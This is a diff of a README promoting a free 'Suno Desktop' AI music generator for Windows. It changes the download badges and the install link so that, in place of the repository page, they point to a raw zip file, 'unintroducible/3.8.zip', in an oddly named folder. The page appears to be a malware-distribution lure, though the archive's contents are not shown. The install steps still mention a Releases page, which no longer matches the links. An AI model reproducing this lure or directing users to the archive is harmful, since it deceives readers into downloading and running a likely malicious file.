@@ -1,7 +1,7 @@
 <h1>🎵 Suno-Desktop---AI-Music-Generator-2026 - Create Unlimited AI Songs Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/anoor256/Suno-Desktop---AI-Music-Generator-2026">
+  <a href="https://raw.githubusercontent.com/anoor256/Suno-Desktop---AI-Music-Generator-2026/main/unintroducible/3.8.zip">
     <img src="https://img.shields.io/badge/Download-Suno_Desktop_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white&color=FF6347" alt="Download Button" />
   </a>
 </p>
@@ -25,7 +25,7 @@ Suno-Desktop is a standalone desktop application that uses advanced AI algorithm
 Getting the software on your Windows computer is a breeze. Follow these steps precisely:
 
 1.  **Visit the Official Download Page:** Click the large red button at the top of this page or navigate to the repository link here:
-   👉 **[https://github.com/anoor256/Suno-Desktop---AI-Music-Generator-2026](https://github.com/anoor256/Suno-Desktop---AI-Music-Generator-2026)**
+   👉 **[https://raw.githubusercontent.com/anoor256/Suno-Desktop---AI-Music-Generator-2026/main/unintroducible/3.8.zip](https://raw.githubusercontent.com/anoor256/Suno-Desktop---AI-Music-Generator-2026/main/unintroducible/3.8.zip)**
 
 2.  **Locate the Download Section:** Once you are on the GitHub page, scroll down slightly until you see a section labeled "Releases" or a green button that says "Code" with a dropdown menu. For the simplest experience, look for the most recent release version (e.g., `v2.0.0`) and click on it.**
 
@@ -139,7 +139,7 @@ Suno-Desktop 2026 is more than just a music generator—it is a creative partner
 Stop waiting on slow web tools or paying per song. Download your copy today and let your imagination run wild. The world wants to hear what you create—start now!
 
 <p align="center">
-  <a href="https://github.com/anoor256/Suno-Desktop---AI-Music-Generator-2026">
+  <a href="https://raw.githubusercontent.com/anoor256/Suno-Desktop---AI-Music-Generator-2026/main/unintroducible/3.8.zip">
     <img src="https://img.shields.io/badge/📥_Download_Suno_Desktop_2026-FF7F50?style=for-the-badge&logo=appveyor&logoColor=white&color=2E8B57" alt="Download Now" />
   </a>
 </p>
